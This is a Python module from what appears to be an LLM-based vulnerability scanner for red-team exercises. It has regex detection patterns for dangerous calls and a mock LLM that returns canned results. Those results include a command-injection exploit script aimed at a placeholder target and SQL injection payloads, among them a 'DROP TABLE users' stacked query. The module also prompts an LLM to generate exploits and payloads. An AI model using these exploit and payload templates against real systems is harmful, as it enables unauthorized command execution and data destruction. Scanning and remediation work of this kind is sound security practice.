import json
import uuid
import logging
import time
from typing import Dict, Any, List, Optional
from datetime import datetime

from .prompts import PromptManager
from .models import AIResult, AnalysisConfig, AnalysisMode
from .llm_client import get_llm_client


logger = logging.getLogger("AIAnalyzer")


class MockLLM:
    """模拟LLM响应生成器 - 专注于高危漏洞"""
    
    HIGH_RISK_PATTERNS = [
        (r"subprocess\.run\([^)]*shell=True", "命令注入", "CWE-78", "Critical", True),
        (r"os\.system\(", "命令注入", "CWE-78", "Critical", True),
        (r"exec\(", "代码执行", "CWE-78", "Critical", True),
        (r"eval\(", "代码执行", "CWE-95", "Critical", True),
        (r"pickle\.loads\(", "反序列化", "CWE-502", "Critical", True),
        (r"yaml\.load\(", "反序列化", "CWE-502", "Critical", True),
        (r"json\.loads\(", "反序列化", "CWE-502", "High", False),
        (r"file\.save\(", "文件写入", "CWE-22", "High", True),
        (r"open\(.*write", "文件写入", "CWE-22", "High", True),
        (r"\.\./", "路径遍历", "CWE-22", "High", True),
        (r"f\"[^\"]*SELECT", "SQL注入", "CWE-89", "Critical", False),
        (r"password\s*=\s*[\"'][^\"']*[\"']", "硬编码凭证", "CWE-798", "Critical", False),
        (r"SECRET_KEY\s*=\s*[\"'][^\"']*[\"']", "硬编码密钥", "CWE-798", "High", False),
        (r"requests\.get\(", "SSRF", "CWE-918", "High", False),
        (r"urllib\.request", "SSRF", "CWE-918", "High", False),
        (r"xml\.parse\(", "XXE", "CWE-611", "Critical", True),
        (r"jinja2\.Template\(", "SSTI", "CWE-94", "Critical", True),
        (r"render_template_string", "SSTI", "CWE-94", "Critical", True),
    ]

    def __init__(self):
        pass

    def generate(self, prompt: str, **kwargs) -> str:
        """模拟LLM生成响应"""
        time.sleep(1)
        
        if "漏洞检测" in prompt or "安全审计" in prompt:
            return self._generate_vulnerability_response(prompt)
        elif "利用脚本" in prompt:
            return self._generate_exploit_response(prompt)
        elif "WebShell" in prompt:
            return self._generate_webshell_response(prompt)
        elif "Payload" in prompt:
            return self._generate_payload_response(prompt)
        elif "整改建议" in prompt:
            return self._generate_remediation_response(prompt)
        else:
            return json.dumps({"result": "分析完成", "confidence": 0.8})

    def _generate_vulnerability_response(self, prompt: str) -> str:
        """生成高危漏洞检测响应"""
        vulnerabilities = []
        
        for pattern, vuln_type, cwe, severity, can_get_shell in self.HIGH_RISK_PATTERNS:
            import re
            if re.search(pattern, prompt):
                vulnerabilities.append({
                    "type": vuln_type,
                    "cwe": cwe,
                    "severity": severity,
                    "location": {"line": 1, "column": 1},
                    "description": f"检测到{pattern}模式，存在{vuln_type}漏洞，可能导致{'远程代码执行' if can_get_shell else '数据泄露'}",
                    "exploitability": "高" if can_get_shell else "中",
                    "can_get_shell": can_get_shell,
                    "attack_vector": "HTTP请求参数",
                    "impact": "可获取服务器权限" if can_get_shell else "数据泄露风险",
                    "code_snippet": pattern,
                    "exploit_method": f"通过精心构造的输入触发{vuln_type}漏洞" if can_get_shell else "通过注入攻击获取敏感信息",
                    "confidence": 0.85 + (len(vulnerabilities) * 0.02)
                })
        
        return json.dumps({"vulnerabilities": vulnerabilities})

    def _generate_exploit_response(self, prompt: str) -> str:
        """生成利用脚本响应"""
        return json.dumps({
            "scripts": [
                {
                    "name": "远程命令执行EXP",
                    "language": "Python",
                    "code": '''#!/usr/bin/env python3
"""远程命令执行漏洞利用脚本"""
import requests

def exploit(url, command):
    payload = f"';{command};'"
    response = requests.get(url, params={"cmd": payload})
    if response.status_code == 200:
        print(f"[+] 命令执行成功:\\n{response.text}")
        return True
    return False

if __name__ == "__main__":
    exploit("http://target.com/exec", "whoami")''',
                    "description": "命令注入漏洞利用脚本",
                    "usage": "python3 exploit.py",
                    "can_get_shell": True
                }
            ]
        })

    def _generate_webshell_response(self, prompt: str) -> str:
        """生成WebShell检测响应"""
        return json.dumps({
            "is_webshell": False,
            "risk_level": "Low",
            "signatures": [],
            "description": "未检测到WebShell特征",
            "malicious_functions": [],
            "trigger_condition": ""
        })

    def _generate_payload_response(self, prompt: str) -> str:
        """生成Payload响应"""
        return json.dumps({
            "payloads": [
                {"type": "基础Payload", "payload": "' OR 1=1--", "description": "SQL注入基础Payload", "bypass_waf": False, "expected_result": "SQL查询返回所有记录"},
                {"type": "UNION查询", "payload": "' UNION SELECT version(),user()--", "description": "获取数据库信息", "bypass_waf": False, "expected_result": "返回数据库版本和用户"},
                {"type": "堆叠查询", "payload": "'; DROP TABLE users--", "description": "执行多条SQL语句", "bypass_waf": False, "expected_result": "删除users表"}
            ]
        })

    def _generate_remediation_response(self, prompt: str) -> str:
        """生成整改建议响应"""
        return json.dumps({
            "title": "使用参数化查询",
            "description": "使用参数化查询替代字符串拼接",
            "fixed_code": "query = \"SELECT * FROM users WHERE id=%s\"\ncursor.execute(query, (user_id,))",
            "explanation": "参数化查询会自动转义用户输入，防止SQL注入",
            "references": ["https://owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"]
        })


class AIAnalyzer:
    """AI智能分析引擎 - 专注于攻防演练可利用漏洞"""

    def __init__(self, config: AnalysisConfig = None, llm_provider: str = None, llm_api_key: str = None):
        self.config = config or AnalysisConfig()
        self.llm = get_llm_client(llm_provider, llm_api_key)
        logger.info(f"AIAnalyzer initialized with LLM: {type(self.llm).__name__}")

    def analyze_code(self, code: str, file_path: str, language: str = "Python") -> AIResult:
        """分析代码 - 专注于高危可利用漏洞"""
        analysis_id = str(uuid.uuid4())[:8]
        start_time = time.time()
        
        vulnerabilities = []
        
        if self.config.enable_vulnerability_detection:
            prompt = PromptManager.get_vulnerability_detection_prompt(code, file_path, language)
            
            try:
                response = self.llm.generate(prompt)
                
                if isinstance(response, str):
                    try:
                        data = json.loads(response)
                        vulnerabilities = data.get("vulnerabilities", [])
                        
                        # 过滤只保留高危漏洞
                        vulnerabilities = [
                            v for v in vulnerabilities 
                            if v.get("severity") in ["Critical", "High"]
                        ]
                    except json.JSONDecodeError:
                        logger.error("Failed to parse LLM response as JSON")
            except Exception as e:
                logger.error(f"LLM analysis error: {e}")
        
        analysis_time = time.time() - start_time
        
        return AIResult(
            analysis_id=analysis_id,
            file_path=file_path,
            vulnerabilities=vulnerabilities,
            code_understanding="",
            attack_surface=[],
            suggestions=[],
            confidence=0.85,
            analysis_time=analysis_time
        )

    def analyze_project(self, project_path: str) -> List[AIResult]:
        """分析项目"""
        import os
        
        results = []
        
        for root, dirs, files in os.walk(project_path):
            for filename in files:
                if filename.endswith((".py", ".js", ".java", ".go", ".php", ".asp")):
                    file_path = os.path.join(root, filename)
                    
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            code = f.read()
                        
                        result = self.analyze_code(code, file_path)
                        results.append(result)
                        
                    except Exception as e:
                        logger.error(f"Failed to analyze {file_path}: {e}")
        
        return results

    def generate_exploit(self, vulnerability: Dict[str, Any], code_context: str) -> Dict[str, Any]:
        """生成利用脚本"""
        prompt = PromptManager.get_exploit_generation_prompt(vulnerability, code_context)
        
        try:
            response = self.llm.generate(prompt)
            if isinstance(response, str):
                return json.loads(response)
        except Exception as e:
            logger.error(f"Exploit generation error: {e}")
        
        return {"scripts": []}

    def generate_payloads(self, vulnerability_type: str) -> Dict[str, Any]:
        """生成Payload"""
        prompt = PromptManager.get_payload_generation_prompt(vulnerability_type)
        
        try:
            response = self.llm.generate(prompt)
            if isinstance(response, str):
                return json.loads(response)
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
        
        return {"payloads": []}

    def detect_webshell(self, code: str, file_path: str) -> Dict[str, Any]:
        """检测WebShell"""
        prompt = PromptManager.get_webshell_detection_prompt(code, file_path)
        
        try:
            response = self.llm.generate(prompt)
            if isinstance(response, str):
                return json.loads(response)
        except Exception as e:
            logger.error(f"WebShell detection error: {e}")
        
        return {"is_webshell": False, "risk_level": "Low"}

    def generate_remediation(self, vulnerability: Dict[str, Any], code_context: str) -> Dict[str, Any]:
        """生成整改建议"""
        prompt = PromptManager.get_remediation_prompt(vulnerability, code_context)
        
        try:
            response = self.llm.generate(prompt)
            if isinstance(response, str):
                return json.loads(response)
        except Exception as e:
            logger.error(f"Remediation generation error: {e}")
        
        return {}